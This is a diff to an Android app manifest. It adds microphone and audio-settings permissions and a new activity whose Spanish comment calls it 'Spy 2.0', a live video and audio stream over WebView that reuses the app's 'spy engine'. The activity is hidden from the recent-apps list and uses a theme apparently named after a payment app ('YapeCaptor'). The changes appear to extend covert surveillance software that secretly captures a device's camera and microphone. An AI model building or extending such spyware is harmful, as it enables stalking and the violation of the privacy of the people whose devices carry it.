@@ -30,6 +30,8 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-feature android:name="android.hardware.camera.any" android:required="false" />
 
     <application
@@ -65,6 +67,13 @@
         </service>
 
         <!-- [MosGuard] cámara de resguardo (foto/cuadros). Foreground service tipo camera. -->
+        <!-- [MosGuard] Spy 2.0: video+audio en vivo por WebView (reusa el motor de espía) -->
+        <activity
+            android:name=".EspiaGuard"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.YapeCaptor" />
+
         <service
             android:name=".CamaraGuard"
             android:exported="false"
